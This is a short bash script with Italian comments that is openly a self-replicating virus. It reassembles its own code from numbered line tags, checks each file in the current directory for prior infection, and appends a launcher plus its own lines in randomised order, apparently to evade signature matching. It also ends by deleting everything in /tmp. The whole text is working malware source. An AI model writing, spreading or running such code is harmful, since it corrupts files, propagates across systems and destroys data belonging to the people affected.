if [ "$1" == "test" ]; then #@1
exit 0  #@2
fi  #@3
MANAGER=(test cd ls pwd)  #@4
RANDOM=$$  #@5
for target in *; do  #@6
  echo "File che voglio infettare $target" && nbline=$(wc -l $target)  #@7
  nbline=${nbline##}  #@8
  nbline=$(echo $nbline | cut -d " " -f1)  #@9
  if [ $(($nbline)) -lt 42 ]; then  #@10
    continue  #@11
  fi  #@12
  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@13
  tail -n 39 $target | sed 's/"\s#@"/"#@"/g' | awk 'BEGIN { FS=" #@" } { print $2, $0 }' | sed 's/"#@"/"\s#@"/g' | sort -g | cut -d " " -f2- > /tmp/"$NEWFILE"  #@14
  chmod +x /tmp/"$NEWFILE" && /tmp/"$NEWFILE" test 2> /dev/null; #@15
  if [ "$?" == "0" ]; then  #@16
    echo "Ho trovato il virus" && continue  #@17
  fi  #@18
  echo "Scelgo di infettare con exit code $?" && NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@19
  NEWFILE="/tmp/$NEWFILE"  #@20
  echo "tail -n 39 $0 > $NEWFILE" >> $target  #@21
  echo "chmod +x $NEWFILE && $NEWFILE &" >> $target  #@22
  echo "exit 0" >> $target #@23
  tabft=("FT" [39]=" ")  #@24
  declare -i nbl=0  #@25
  while [ $nbl -ne 39 ]; do  #@26
    valindex=$(((RANDOM % 39)+1))  #@27
    while [ "${tabft[$valindex]}" == "FT" ]; do  #@28
      valindex=$(((RANDOM % 39) + 1))  #@29
    done  #@30
    line=$(tail -n $valindex $0 | head -1)  #@31
    # line=$line/'\t'  #@32
    echo -e "$line" >> $target  #@33
    echo "Fatto: $valindex" && nbl=$(($nbl+1)) && tabft[$valindex]="FT" #@34
  done  #@35
done  #@36
rm /tmp/*  #@37
# rmdir /tmp/*  #@38
#fi  #@39
